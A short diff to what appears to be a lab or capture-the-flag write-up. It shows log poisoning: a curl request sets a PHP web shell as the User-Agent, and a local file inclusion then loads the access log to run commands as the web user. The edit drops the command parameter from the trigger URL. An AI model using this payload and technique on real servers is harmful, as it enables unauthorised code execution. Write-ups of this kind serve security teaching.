@@ -72,7 +72,7 @@ curl -s -A '<?php system($_GET[c]); ?>' http://<IP>/
 We then trigger the payload through the LFI:
 
 ```text
-http://<IP>/browse.php?file=/var/log/httpd-access.log&c=id
+http://<IP>/browse.php?file=/var/log/httpd-access.log
 ```
 
 The command executes as the `www` user, confirming RCE.
